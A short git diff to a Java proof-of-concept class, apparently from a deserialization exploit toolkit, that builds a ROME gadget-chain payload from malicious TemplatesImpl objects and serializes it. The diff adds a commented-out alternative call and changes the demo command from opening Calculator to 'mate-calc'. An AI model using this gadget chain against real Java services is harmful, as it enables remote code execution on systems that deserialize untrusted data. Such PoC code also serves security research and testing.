@@ -22,6 +22,7 @@ public class Rome implements POC{
         TemplatesImpl templatesimpl = GTemplates.getEvilTemplates(cmd);
 
         Object o = GRome.toString2Getter(Templates.class,templatesimpl);
+//        Object o = GRome.toString2Getter(templatesimpl);
 
         Object poc = GHashMap.deserialize2HashCode(o,o);
 
@@ -38,7 +39,7 @@ public class Rome implements POC{
 
     public static void main(String[] args) throws Exception{
         //Rome gen = new Rome();
-        String cmd = "open /System/Applications/Calculator.app";
+        String cmd = "mate-calc";
         {
             Object poc = new Rome().getPocObject(cmd);
             byte[] b = SerializeUtils.serialize(poc);
